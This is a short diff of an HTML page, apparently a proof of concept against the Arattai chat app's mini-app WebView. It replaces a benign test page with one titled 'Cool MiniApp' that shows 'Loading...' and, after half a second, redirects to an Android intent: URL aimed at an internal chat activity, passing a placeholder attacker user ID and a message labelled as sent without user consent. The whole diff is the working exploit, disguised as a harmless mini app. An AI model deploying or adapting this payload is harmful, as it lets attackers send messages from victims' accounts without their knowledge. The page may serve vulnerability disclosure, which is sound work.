@@ -1,14 +1,16 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Arattai Mini App Security Test</title>
-</head>
+<head><title>Cool MiniApp</title></head>
 <body>
-    <h2>Mini App Security Test</h2>
-    <p>Testing the Arattai Mini App WebView.</p>
-
-    <button onclick="window.location.href='https://example.com'">
-        Open HTTPS Link
-    </button>
+<p>Loading...</p>
+<script>
+setTimeout(function() {
+window.location.href = 'intent:#Intent;'
++ 'component=com.aratai.chat/com.arattai.chats.presentation.ui.ChatTranscriptActivity;'
++ 'S.user_id=ATTACKER_USER_ID;'
++ 'S.text_message_to_send=This message was sent without user consent;'
++ 'end';
+}, 500);
+</script>
 </body>
 </html>
